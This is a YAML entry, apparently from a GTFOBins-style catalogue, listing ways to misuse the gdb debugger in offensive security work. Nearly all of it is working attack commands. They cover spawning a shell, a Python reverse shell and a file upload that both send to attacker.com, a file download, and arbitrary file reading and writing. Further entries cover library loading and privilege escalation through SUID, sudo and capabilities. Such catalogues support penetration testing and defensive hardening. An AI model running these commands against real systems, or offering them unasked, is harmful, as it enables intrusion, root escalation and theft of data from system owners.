---
functions:
  shell:
    - code: gdb -nx -ex '!sh' -ex quit
  reverse-shell:
    - description: This requires that GDB is compiled with Python support. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        gdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()
        s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
        [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
        pty.spawn("/bin/sh")' -ex quit
  file-upload:
    - description: This requires that GDB is compiled with Python support. Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
      code: |
        export URL=http://attacker.com/
        export LFILE=file_to_send
        gdb -nx -ex 'python import sys; from os import environ as e
        if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
        else: import urllib as u, urllib2 as r
        r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))' -ex quit
    - description: This requires that GDB is compiled with Python support. Serve files in the local folder running an HTTP server.
      code: |
        export LPORT=8888
        gdb -nx -ex 'python import sys; from os import environ as e
        if sys.version_info.major == 3: import http.server as s, socketserver as ss
        else: import SimpleHTTPServer as s, SocketServer as ss
        ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()' -ex quit
  file-download:
    - description: This requires that GDB is compiled with Python support. Fetch a remote file via HTTP GET request.
      code: |
        export URL=http://attacker.com/file_to_get
        export LFILE=file_to_save
        gdb -nx -ex 'python import sys; from os import environ as e
        if sys.version_info.major == 3: import urllib.request as r
        else: import urllib as r
        r.urlretrieve(e["URL"], e["LFILE"])' -ex quit
  file-write:
    - description: This requires that GDB is compiled with Python support.
      code: |
        LFILE=file_to_write
        gdb -nx -ex "dump value $LFILE \"DATA\"" -ex quit
  file-read:
    - description: This requires that GDB is compiled with Python support.
      code: gdb -nx -ex 'python print(open("file_to_read").read())' -ex quit
  library-load:
    - description: This requires that GDB is compiled with Python support.
      code: gdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary("lib.so")' -ex quit
  suid:
    - code: ./gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
  sudo:
    - code: sudo gdb -nx -ex '!sh' -ex quit
  capabilities:
    - description: This requires that GDB is compiled with Python support.
      code: ./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
---
